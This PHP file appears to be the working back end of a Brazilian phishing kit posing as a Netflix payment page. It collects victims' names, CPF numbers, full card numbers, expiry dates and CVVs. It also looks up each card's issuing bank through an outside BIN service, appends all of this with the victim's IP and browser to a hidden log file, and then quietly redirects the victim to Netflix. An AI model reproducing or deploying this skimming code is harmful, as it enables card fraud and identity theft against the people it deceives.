<?php
error_reporting(0);
function getStr($string, $inicio, $fim, $n=1){
  $string = explode($inicio, $string);
  $string = explode($fim, $string[$n]);
  return $string[0];
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }

function TestarBin($bin){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.exactbins.com/bin-lookup');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: www.exactbins.com',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: https://www.exactbins.com/bin-lookup'));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'binnum='.$bin.'&6_letters_code=&SearchBin=Search+Bin=');
        $resposta = curl_exec($ch);
        $bandeira = getStr($resposta, '<td>', '</td>', 8);
        $banco = getStr($resposta, '<td>', '</td>', 9);
        $tipo = getStr($resposta, '<td>', '</td>', 10);
        $categoria = getStr($resposta, '<td>', '</td>', 11);
        $pais = getStr($resposta, '<td>', '</td>', 12);
        return $bandeira." - ".$pais." - ".$tipo." - ".$banco." - ".$categoria;
}

$firstName = $_POST["firstName"];

$lastName = $_POST["lastName"];

$creditCardNumber = $_POST['creditCardNumber'];

$creditExpirationMonth = $_POST['creditExpirationMonth'];

$creditCardSecurityCode = $_POST['creditCardSecurityCode'];

$CPF = $_POST['cpf'];

$info = TestarBin(substr($creditCardNumber, 0,6));

//----------------------------------------
$ip = $_SERVER["REMOTE_ADDR"];

 date_default_timezone_set('America/Sao_Paulo');
  $dataLocal = date('d/m/Y - H:i:s', time());


$tudo = "Nome: ".$firstName." ".$lastName."<br>CPF: ".$CPF."<br>CC: ".$creditCardNumber."<br>Validade: ".$creditExpirationMonth."<br>CVV2: ".$creditCardSecurityCode."<br>Info: ".$info."<br>IP: ".$ip." (".$browser.")<br>Hora: ".$dataLocal."<br><br>";


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$abrir = fopen(getcwd().'/mina_de_ourokk.htm', 'a');
fwrite($abrir, $tudo);
     
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
echo"<meta http-equiv='refresh' content='2;url=https://www.netflix.com/browse'>";
?>
